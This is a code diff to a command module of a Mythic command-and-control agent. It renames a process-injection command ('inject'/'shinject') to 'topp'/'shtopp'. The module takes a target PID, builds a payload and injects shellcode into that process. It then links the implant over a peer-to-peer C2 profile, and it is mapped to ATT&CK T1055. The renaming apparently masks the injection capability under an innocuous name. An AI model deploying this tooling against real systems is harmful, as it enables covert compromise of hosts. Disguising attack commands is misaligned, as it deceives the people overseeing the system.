@@ -75,7 +75,7 @@ class toppArguments(TaskArguments):
             raise Exception("Required non-zero PID")
 
 
-temp_inject_link_data = {}
+temp_topp_link_data = {}
 
 
 async def link_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
@@ -91,7 +91,7 @@ async def link_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompleti
     return response
 
 
-async def inject_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
+async def topp_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
     response = PTTaskCompletionFunctionMessageResponse(Success=True, Completed=True)
     resp = await SendMythicRPCResponseSearch(MythicRPCResponseSearchMessage(
         TaskID=task.SubtaskData.Task.ID
@@ -102,24 +102,24 @@ async def inject_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskComple
             Response=r.Response
         ))
     if "error" not in task.SubtaskData.Task.Status:
-        if task.TaskData.Task.ID in temp_inject_link_data:
+        if task.TaskData.Task.ID in temp_topp_link_data:
             response.Completed = False
             subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
                 TaskID=task.TaskData.Task.ID,
                 CommandName="link",
                 SubtaskCallbackFunction="link_callback",
                 Params=json.dumps({
-                    "connection_info": temp_inject_link_data[task.TaskData.Task.ID]
+                    "connection_info": temp_topp_link_data[task.TaskData.Task.ID]
                 })
             ))
-            del temp_inject_link_data[task.TaskData.Task.ID]
+            del temp_topp_link_data[task.TaskData.Task.ID]
     return response
 
 
 class toppCommand(CommandBase):
     cmd = "topp"
     attributes=CommandAttributes(
-        dependencies=["shinject"]
+        dependencies=["shtopp"]
     )
     needs_admin = False
     help_cmd = "topp (modal popup)"
@@ -129,7 +129,7 @@ class toppCommand(CommandBase):
     author = "@djhohnstein"
     argument_class = toppArguments
     attackmapping = ["T1055"]
-    completion_functions = {"inject_callback": inject_callback, "link_callback": link_callback}
+    completion_functions = {"topp_callback": topp_callback, "link_callback": link_callback}
     supported_ui_features = ["process_browser:topp"]
 
     async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
@@ -200,7 +200,7 @@ class toppCommand(CommandBase):
         if not is_p2p:
             subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
                 TaskID=taskData.Task.ID,
-                CommandName="shinject",
+                CommandName="shtopp",
                 Params=json.dumps({"pid": taskData.args.get_arg("pid"), "shellcode-file-id": payload.AgentFileId})
             ))
         else:
@@ -213,17 +213,17 @@ class toppCommand(CommandBase):
             connection_info["c2_profile"]["parameters"] = connection_info["c2_profile"]["c2_profile_parameters"]
             del connection_info["c2_profile"]["c2_profile"]
             del connection_info["c2_profile"]["c2_profile_parameters"]
-            temp_inject_link_data[taskData.Task.ID] = connection_info
+            temp_topp_link_data[taskData.Task.ID] = connection_info
             subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
                 TaskID=taskData.Task.ID,
-                SubtaskCallbackFunction="inject_callback",
-                CommandName="shinject",
+                SubtaskCallbackFunction="topp_callback",
+                CommandName="shtopp",
                 Params=json.dumps({"pid": taskData.args.get_arg("pid"), "shellcode-file-id": payload.AgentFileId})
             ))
             if not subtask.Success:
                 response.Success = False
                 response.Error = subtask.Error
-                del temp_inject_link_data[taskData.Task.ID]
+                del temp_topp_link_data[taskData.Task.ID]
         return response
 
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
